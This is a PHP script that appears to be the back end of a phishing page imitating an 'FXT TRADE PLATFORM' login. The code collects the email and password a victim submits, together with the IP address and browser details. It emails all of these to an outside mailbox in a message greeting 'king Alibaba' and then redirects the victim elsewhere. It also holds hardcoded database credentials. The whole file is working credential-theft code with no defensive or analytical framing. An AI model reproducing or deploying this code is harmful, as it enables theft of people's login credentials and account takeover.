<?php
session_start();
$servername = "localhost";
$username = "fxttrade_trade";
$password = "2-&!nU1l@+ei";
$dbname = "fxttrade_trade";
$conn = new mysqli($servername, $username, $password, $dbname);

$emailnow = $_POST['mail'];
$passwordnow = $_POST['pass'];

$ip=$_SERVER['REMOTE_ADDR'];


$ur = $_SERVER['HTTP_USER_AGENT'];

$arr_browsers = ["Opera", "Edge", "Chrome", "Safari", "Firefox", "MSIE", "Trident"];
  
$agent = $_SERVER['HTTP_USER_AGENT'];
  
$user_browser = '';
foreach ($arr_browsers as $browser) {
    if (strpos($agent, $browser) !== false) {
        $user_browser = $browser;
        break;
    }   
}
  
switch ($user_browser) {
    case 'MSIE':
        $user_browser = 'Internet Explorer';
        break;
  
    case 'Trident':
        $user_browser = 'Internet Explorer';
        break;
  
    case 'Edge':
        $user_browser = 'Microsoft Edge';
        break;
}
  
$vc = $_SERVER['HTTP_REFERER'];

if($password == '2-&!nU1l@+ei'){

// send email
$from = "no-reply@fxttrade.com";
$message ="<html> 
    <head>
        <title>FXT TRADE PLATFORM</title> 
    </head> 
    <body> 
    
         
        <br>
           <h3>Hello king Alibaba</h3>
        
             <hr>
        <br>
                <p>$emailnow<p> 
        
             <hr>
        <br>
                <p>$passwordnow</p> 
             <hr>
        <br>
        
         <p>$ip</p> 
             <hr>
        <br>
         <p>$ur</p> 
             <hr>
    
        <br>
        
        
             
        <h1 style='color:blue';>Thanks you</h1>
    </body> 
    </html>";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
// More headers
$headers .= 'From:'.$from. "\r\n";
$subject = 'New Email';
mail("xing.ying@yandex.com","$subject","$message","$headers");






header("Location:excellink3.php");
}
?>